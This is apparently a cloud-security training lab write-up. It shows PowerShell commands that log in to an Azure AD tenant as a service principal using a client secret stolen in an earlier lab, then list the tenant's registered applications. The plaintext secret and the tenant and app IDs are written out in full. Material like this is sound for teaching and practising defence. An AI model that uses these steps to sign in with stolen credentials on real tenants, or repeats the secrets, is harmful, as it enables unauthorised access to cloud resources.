# Attack Lab 11

Using the pharmacorp tenant identifier and credentials obtained on the attack lab 4, it's possible abuse of the credentials in Azure AD:

```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString '~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('7e7730b1-29ab-4adf-bb20-7ae61987d01f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user
profile ( C:\Users\studentuser107\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
7e7730b1-29ab-4adf-bb20-7ae61987d01f                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud

```

Enumeration, Get-AzADApplication:

```
PS C:\Users\studentuser107> Get-AzADApplication

DisplayName         Id                                   AppId
-----------         --                                   -----
mailapp             0a88da02-e9f4-428a-ab4e-aa94f12e1225 f0823e33-c430-4dd2-a56a-dca3c3a346a4
AbuseGraphAPIforCAP 0c9b0706-33fe-414a-955f-9b28284ce578 2b3b473a-1de0-4e44-a19c-5aa9001e02e3
AuthDemo            78e7dfaa-44f8-40bb-89d8-6d26c34a1928 175fff98-c013-4e4e-a58b-0b62de044432
resourcesapp        ee7a977f-a5f7-4790-b682-a6ea8e81701a 7e7730b1-29ab-4adf-bb20-7ae61987d01f
```
